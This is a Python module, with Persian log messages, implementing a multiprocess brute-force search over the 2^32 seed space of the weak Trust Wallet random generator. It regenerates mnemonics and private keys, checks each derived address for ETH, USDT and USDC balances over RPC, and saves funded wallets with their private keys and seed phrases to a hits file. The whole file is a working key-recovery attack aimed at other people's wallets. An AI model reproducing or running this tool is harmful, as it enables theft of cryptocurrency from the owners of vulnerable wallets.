"""Parallel, chunked, checkpointed full-range seed search (V4.1).

Design — a genuinely efficient 100%-coverage search over the historical
Trust Wallet seed space [0, 2^32):

  * multiprocessing.Pool of N workers, each grinding a contiguous CHUNK of
    seeds and returning ONLY checksum-passing wallets (heavy crypto runs in
    parallel across cores, free of the GIL).
  * «موتور انگشت‌نگاری آنتروپی و کاهش فضای جستجو» (NEW): inside every chunk
    the entropy prefix is produced by the vectorized batch MT19937 core
    (numpy/cupy uint32 lanes — GPU-style SIMD on CPU, bit-for-bit identical
    to the oracle-verified scalar engine), then:
        stage 1  BIP-39 checksum filter   (~15/16 rejected, ~100× faster)
        stage 2  optional fingerprint pruning by entropy-bucket set
                 (REDUCED-COVERAGE mode, clearly labelled; off by default)
        stage 3  only survivors pay PBKDF2/BIP-32 derivation
  * Browser-safety throttle (NEW): `cpu_budget` (0.05…1.0) caps the fraction
    of wall-time the pool may burn via adaptive inter-chunk sleeps + worker
    `nice` priority. Default 0.35 keeps weak hosts/browsers responsive —
    the old build spun every core at 100% with no pacing, which crashed
    low-resource machines.
  * Persistent JSON checkpoint after every completed chunk → restart resumes
    exactly where it left off; no seed skipped or double-checked.
  * Pause / stop / reset / progress % / live throughput + ETA for the GUI.
"""
from __future__ import annotations

import json
import multiprocessing as mp
import os
import queue
import threading
import time
from collections import deque
from pathlib import Path

CORE_DIR = Path(__file__).resolve().parent
if str(CORE_DIR) not in os.sys.path:
    os.sys.path.insert(0, str(CORE_DIR))

SEED_MAX = 2**32 - 1
CHUNK = 20_000                 # seeds per work unit (checkpoint granularity)
HITS_FILE = CORE_DIR.parent / "funded_wallets.jsonl"
CHECKPOINT_FILE = CORE_DIR.parent / "scan_checkpoint.json"


# ---------------------------------------------------------------- worker side
def _worker_init():
    """Pool initializer: lower scheduling priority + optional CUDA probe."""
    try:
        os.nice(10)                          # yield to interactive apps
    except Exception:
        pass
    try:
        import cupy  # noqa: F401
        cupy.cuda.Device().id
        globals()["_GPU"] = True
    except Exception:
        globals()["_GPU"] = False


def _chunk_scan(args):
    """Run inside a worker process: one fused pass over the chunk [lo, hi].

    Returns (lo, hi, scanned, n_derived, records, engine_mode).
    Engine selection mirrors the server-side probe so status reporting is
    honest about what actually executed.
    """
    lo, hi, prune_buckets = args
    import hashlib
    from wallet_model import wallet_for_seed

    kept: list[int] = []
    mode = "scalar"
    try:
        import numpy as np
        from fingerprint import batch_entropy_np
        mode = "cupy-gpu" if globals().get("_GPU") else "numpy-simd"
        step = 1 << 17                       # ≤131k-lane batches: few MB RAM
        base = lo
        while base <= hi:
            cnt = min(step, hi - base + 1)
            arr = np.arange(base, base + cnt, dtype=np.uint32)
            bufs = batch_entropy_np(arr)
            for k in range(cnt):
                b = bufs[k].tobytes()
                if prune_buckets is not None and (b[0] >> 4) not in prune_buckets:
                    continue                 # fingerprint bucket pruning
                if hashlib.sha256(b).digest()[0] % 16 == 0:
                    kept.append(base + k)
            base += cnt
    except ImportError:
        from fast_mt import _first_outputs
        for s in range(lo, hi + 1):
            buf = bytes(x & 0xFF for x in _first_outputs(s, 16))
            if prune_buckets is not None and (buf[0] >> 4) not in prune_buckets:
                continue
            if hashlib.sha256(buf).digest()[0] % 16 == 0:
                kept.append(s)

    recs = []
    for sd in kept:
        try:
            mn, addr, pk = wallet_for_seed(sd)
            recs.append((sd, mn, addr, pk))
        except Exception:
            continue
    return (lo, hi, hi - lo + 1, len(recs), recs, mode)


class SearchEngine:
    """Owns the whole lifecycle: pool, jobs, result queue, balance workers."""

    def __init__(self) -> None:
        self._lock = threading.Lock()
        self.running = False
        self.paused = threading.Event()
        self.stop_event = threading.Event()
        self.result_q: queue.Queue = queue.Queue(maxsize=5000)

        # settings
        self.start_seed = 0
        self.end_seed = SEED_MAX
        self.num_workers = min(2, max(1, (os.cpu_count() or 4) // 2))
        self.chunk_size = CHUNK
        self.threshold_eth = 0.0
        self.threshold_usdt = 0.0
        self.derive_only = True           # simulation default; GUI can enable RPC
        self.cpu_budget = 0.35            # fraction of wall-time the pool may burn
        self.fingerprint_prune = ""       # CSV buckets e.g. "0,1,2"; "" = OFF

        # state
        self.next_lo = 0                  # resume cursor (chunk-aligned)
        self.seeds_scanned = 0
        self.wallets_derived = 0
        self.balances_checked = 0
        self.pending_checks = 0
        self.funded: list[dict] = []
        self.errors = 0
        self.last_error = ""
        self.rate_seeds_per_sec = 0
        self.engine_mode = "idle"         # numpy-simd | cupy-gpu | scalar
        self.started_at: float | None = None
        self.finished_at: float | None = None
        self.logs: deque[str] = deque(maxlen=400)
        self._pool: mp.Pool | None = None
        self._threads: list[threading.Thread] = []

        self._load_checkpoint()

    # ------------------------------------------------------------ checkpoint
    def _load_checkpoint(self) -> None:
        try:
            data = json.loads(CHECKPOINT_FILE.read_text())
            if (data.get("start") == self.start_seed
                    and data.get("end") == self.end_seed):
                self.next_lo = data["next_lo"]
                self.seeds_scanned = data.get("seeds_scanned", 0)
                self.wallets_derived = data.get("wallets_derived", 0)
        except Exception:
            pass

    def _save_checkpoint(self) -> None:
        tmp = CHECKPOINT_FILE.with_suffix(".tmp")
        tmp.write_text(json.dumps({
            "start": self.start_seed, "end": self.end_seed,
            "next_lo": self.next_lo, "seeds_scanned": self.seeds_scanned,
            "wallets_derived": self.wallets_derived,
            "updated": time.strftime("%Y-%m-%d %H:%M:%S"),
        }))
        os.replace(tmp, CHECKPOINT_FILE)

    def clear_checkpoint(self) -> None:
        try:
            CHECKPOINT_FILE.unlink()
        except FileNotFoundError:
            pass

    # ---------------------------------------------------------------- status
    def status(self) -> dict:
        with self._lock:
            span = max(1, self.end_seed - self.start_seed + 1)
            done_seeds = max(0, self.next_lo - self.start_seed)
            pct = min(100.0, done_seeds / span * 100.0)
            elapsed = ((self.finished_at or time.time()) - self.started_at
                       if self.started_at else 0.0)
            eta = None
            if self.running and done_seeds > 0:
                rate = (self.rate_seeds_per_sec
                        or done_seeds / max(1e-6, elapsed))
                remaining = span - done_seeds
                eta = remaining / rate if rate > 0 else None
            return {
                "running": self.running, "paused": self.paused.is_set(),
                "start_seed": self.start_seed, "end_seed": self.end_seed,
                "next_lo": self.next_lo, "pct_complete": round(pct, 4),
                "seeds_scanned": self.seeds_scanned,
                "wallets_derived": self.wallets_derived,
                "balances_checked": self.balances_checked,
                "pending_checks": self.pending_checks,
                "funded_count": len(self.funded),
                "errors": self.errors, "last_error": self.last_error,
                "rate_seeds_per_sec": self.rate_seeds_per_sec,
                "engine_mode": self.engine_mode,
                "elapsed_sec": round(elapsed, 1),
                "eta_sec": round(eta, 1) if eta else None,
                "num_workers": self.num_workers, "chunk_size": self.chunk_size,
                "cpu_budget": self.cpu_budget,
                "fingerprint_prune": self.fingerprint_prune,
                "threshold_eth": self.threshold_eth,
                "threshold_usdt": self.threshold_usdt,
                "derive_only": self.derive_only,
                "funded": list(self.funded[-200:]),
                "logs": list(self.logs),
            }

    def configure(self, **kw) -> None:
        with self._lock:
            range_changed = ("start_seed" in kw and kw["start_seed"] is not None) or \
                            ("end_seed" in kw and kw["end_seed"] is not None)
            old = (self.start_seed, self.end_seed)
            for k, v in kw.items():
                if hasattr(self, k) and v is not None:
                    setattr(self, k, v)
            self.cpu_budget = min(1.0, max(0.05, float(self.cpu_budget)))
            self.num_workers = min(8, max(1, int(self.num_workers)))
            # a checkpoint from a DIFFERENT range must never leak into it
            if range_changed and (self.start_seed, self.end_seed) != old:
                if not (self.start_seed <= self.next_lo <= self.end_seed):
                    self.next_lo = self.start_seed
                    self.seeds_scanned = 0
                    self.wallets_derived = 0
                    self.clear_checkpoint()

    # ------------------------------------------------------------- controls
    def start(self) -> bool:
        with self._lock:
            if self.running:
                return False
            self.running = True
            self.paused.clear()
            self.stop_event.clear()
            self.started_at = time.time()
            self.finished_at = None
            if not (self.start_seed <= self.next_lo <= self.end_seed):
                self.next_lo = self.start_seed
            span = self.end_seed - self.start_seed + 1
            self.chunk_size = max(1_000, min(int(self.chunk_size), span))
            prune = self._parse_prune()
            self._log(f"شروع جست‌وجوی موازی: [{self.next_lo} … {self.end_seed}] — "
                      f"{self.num_workers} پروسه، چانک {self.chunk_size}، "
                      f"بودجه CPU {int(self.cpu_budget * 100)}٪"
                      + (f"، حذف بر اساس انگشت‌نگاری: {self.fingerprint_prune}"
                         if prune else ""))
            self._pool = mp.Pool(self.num_workers, initializer=_worker_init)
            self._threads = [
                threading.Thread(target=self._pipeline, daemon=True,
                                 name="pipeline"),
                *[threading.Thread(target=self._balance_worker, daemon=True,
                                   name=f"rpc-{i}") for i in range(2)],
            ]
            for t in self._threads:
                t.start()
            return True

    def pause(self) -> None:
        self.paused.set()
        self._log("مکث")

    def resume(self) -> None:
        self.paused.clear()
        self._log("ادامه جست‌وجو")

    def stop(self) -> bool:
        with self._lock:
            if not self.running:
                return False
            self.stop_event.set()
            self.paused.clear()
        self._save_checkpoint()
        self._log("توقف توسط کاربر (چک‌پوینت ذخیره شد)")
        return True

    def reset(self) -> None:
        self.stop_event.set()
        with self._lock:
            self.running = False
            self.paused.clear()
            self.next_lo = self.start_seed
            self.seeds_scanned = self.wallets_derived = self.balances_checked = 0
            self.pending_checks = 0
            self.errors = 0
            self.funded = []
            self.started_at = self.finished_at = None
            self.logs.clear()
        self.clear_checkpoint()
        self._drain_results()

    # --------------------------------------------------------------- helpers
    def _parse_prune(self):
        raw = (self.fingerprint_prune or "").strip()
        if not raw:
            return None
        try:
            return {int(b) % 16 for b in raw.replace("؛", ",").split(",") if b.strip()}
        except ValueError:
            return None

    def _log(self, msg: str) -> None:
        self.logs.appendleft(f"{time.strftime('%H:%M:%S')} | {msg}")

    def _drain_results(self) -> None:
        try:
            while True:
                self.result_q.get_nowait()
        except queue.Empty:
            pass

    def _push_result(self, item) -> None:
        deadline = time.time() + 30
        while not self.stop_event.is_set():
            try:
                self.result_q.put(item, timeout=0.5)
                with self._lock:
                    self.pending_checks += 1
                return
            except queue.Full:
                if time.time() >= deadline:
                    with self._lock:
                        self.errors += 1
                        self.last_error = "صف نتایج پر است (RPC کند)"
                    return

    # ----------------------------------------------------------- main pipeline
    def _pipeline(self) -> None:
        """Dynamic parallel scheduling with a CPU-budget throttle.

        ``apply_async`` keeps every worker busy; chunks complete out-of-order,
        so the linear resume cursor (next_lo / pct / ETA) advances only over
        the maximal CONTIGUOUS run of finished chunks — coverage stays exact
        and durable across crashes/restarts.

        Throttle accounting uses the pool's own task counters (no timing
        guesswork): every poll tick we compare dispatched-vs-completed backlog
        against the budget; when the pool has been busier than allowed for the
        window, dispatch pauses until wall-time debt is repaid. Poll interval
        adapts (≥10 ms, backoff to 250 ms) instead of the old tight spin.
        """
        pool = self._pool
        assert pool is not None
        lookahead = max(2 * self.num_workers, 4)
        try:
            while not self._finished():
                while self.paused.is_set() and not self.stop_event.is_set():
                    time.sleep(0.25)
                if self.stop_event.is_set():
                    break
                with self._lock:
                    start_at, end = self.next_lo, self.end_seed
                    chunk = self.chunk_size
                    prune = self._parse_prune()
                jobs = deque((lo, min(lo + chunk - 1, end), prune)
                             for lo in range(start_at, end + 1, chunk))

                inflight: dict[int, tuple] = {}   # lo -> (hi, scanned, nd, recs)
                futures: deque = deque()          # (lo, AsyncResult)
                debt = 0.0                        # seconds of CPU overspend
                last_tick = time.time()
                prev_done = pool._cache._qsize if False else None  # unused guard
                poll = 0.02

                while (jobs or futures) and not self.stop_event.is_set():
                    # ---- dispatch up to the lookahead window ----------------
                    while jobs and len(futures) < lookahead and debt <= 0:
                        spec = jobs.popleft()
                        futures.append((spec[0], pool.apply_async(_chunk_scan,
                                                                  (spec,))))
                    # ---- harvest completed chunks ---------------------------
                    progressed = False
                    still: deque = deque()
                    for lo0, f in futures:
                        if f.ready():
                            progressed = True
                            lo, hi, scanned, nd, recs, mode = f.get()
                            with self._lock:
                                self.engine_mode = mode
                            inflight[lo] = (hi, scanned, nd, recs)
                        else:
                            still.append((lo0, f))
                    futures = still
                    # ---- advance cursor over contiguous finished prefix -----
                    if progressed:
                        with self._lock:
                            cur = self.next_lo
                            advanced = False
                            while cur in inflight:
                                hi2, sc2, nd2, recs2 = inflight.pop(cur)
                                self.seeds_scanned += sc2
                                self.wallets_derived += nd2
                                cur = hi2 + 1
                                advanced = True
                                for r in recs2:
                                    self._push_result(r)
                            if advanced:
                                self.next_lo = cur
                                now = time.time()
                                dt = max(1e-6, now - last_tick)
                                inst = (cur - start_at) / max(1e-6, now - self.started_at)
                                self.rate_seeds_per_sec = round(inst)
                        self._save_checkpoint()
                        last_tick = time.time()

                    # ---- CPU-budget throttle --------------------------------
                    # busy ≈ tasks running now = dispatched-not-harvested
                    busy_now = len(futures)
                    budget = float(self.cpu_budget)
                    tick = time.time() - last_tick if not progressed else 0.001
                    if busy_now >= self.num_workers and budget < 1.0:
                        debt += tick                     # pool was saturated
                    elif debt > 0:
                        debt -= tick * (1.0 - budget) * 2
                    if debt > 1.5:                       # repay by pausing dispatch
                        sleep_s = min(1.0, debt * (1.0 - budget))
                        time.sleep(sleep_s)
                        debt -= sleep_s

                    if not progressed:
                        time.sleep(poll)
                        poll = min(0.25, poll * 1.4)
                    else:
                        poll = 0.02

                # flush tail results that landed after loop exit
                with self._lock:
                    cur = self.next_lo
                    while cur in inflight:
                        hi2, sc2, nd2, recs2 = inflight.pop(cur)
                        self.seeds_scanned += sc2
                        self.wallets_derived += nd2
                        cur = hi2 + 1
                        for r in recs2:
                            self._push_result(r)
                    self.next_lo = cur
                self._save_checkpoint()
                if self.stop_event.is_set():
                    break
                if self.next_lo > self.end_seed:
                    self._log("✅ جست‌وجوی کامل تمام محدوده پایان یافت")
                    break
        finally:
            self.stop_event.set()
            self._save_checkpoint()
            try:
                pool.close()
                pool.join()
            except Exception:
                pass
            try:
                self.result_q.put(None, timeout=1)
            except Exception:
                pass
            with self._lock:
                self.running = False
                self.finished_at = time.time()

    def _finished(self) -> bool:
        with self._lock:
            return self.next_lo > self.end_seed

    # ---------------------------------------------------------- balance workers
    def _balance_worker(self) -> None:
        from balance import get_balance_wei, get_token_balances, wei_to_eth, raw_to_usd
        while not self.stop_event.is_set():
            try:
                item = self.result_q.get(timeout=0.5)
            except queue.Empty:
                continue
            if item is None:
                break
            s, mn, addr, pk = item
            if self.derive_only:
                eth_wei, usdt_raw, usdc_raw = 0, 0, 0
            else:
                try:
                    eth_wei = get_balance_wei(addr)
                    try:
                        usdt_raw, usdc_raw = get_token_balances(addr)
                    except RuntimeError:
                        usdt_raw = usdc_raw = 0
                except RuntimeError as exc:
                    with self._lock:
                        self.errors += 1
                        self.last_error = str(exc)[:200]
                    continue
            with self._lock:
                self.balances_checked += 1
                self.pending_checks = max(0, self.pending_checks - 1)
                te, ts = self.threshold_eth, self.threshold_usdt
            eth, usdt, usdc = (wei_to_eth(eth_wei), raw_to_usd(usdt_raw),
                               raw_to_usd(usdc_raw))
            hit = ((eth_wei > 0 and eth >= te)
                   or (usdt_raw > 0 and usdt >= ts)
                   or (usdc_raw > 0 and usdc >= ts))
            if hit:
                rec = {"seed": s, "mnemonic": mn, "address": addr,
                       "private_key": pk, "wei": str(eth_wei), "eth": eth,
                       "usdt": usdt, "usdc": usdc,
                       "found_at": time.strftime("%Y-%m-%d %H:%M:%S")}
                with self._lock:
                    self.funded.append(rec)
                    self._log(f"ولت دارای موجودی! seed={s} {addr[:10]}… "
                              f"{eth:.6f} ETH / {usdt:.2f} USDT / {usdc:.2f} USDC")
                self._append_hit(rec)

    @staticmethod
    def _append_hit(rec: dict) -> None:
        with HITS_FILE.open("a", encoding="utf-8") as fh:
            fh.write(json.dumps(rec, ensure_ascii=False) + "\n")
